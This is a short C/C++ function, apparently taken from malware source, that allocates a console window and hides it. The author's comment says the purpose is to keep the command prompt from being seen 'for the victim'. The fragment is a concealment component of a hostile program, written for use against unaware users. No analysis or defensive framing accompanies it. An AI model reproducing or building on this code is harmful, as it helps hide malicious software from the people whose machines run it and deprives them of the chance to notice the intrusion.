void Stealth() {                                        //Done to not show the comand prompt for the victim ;)
    HWND hWnd;
    AllocConsole();
    hWnd = FindWindowA("ConsoleWindowClass", 0);
    ShowWindow(hWnd, 0);
}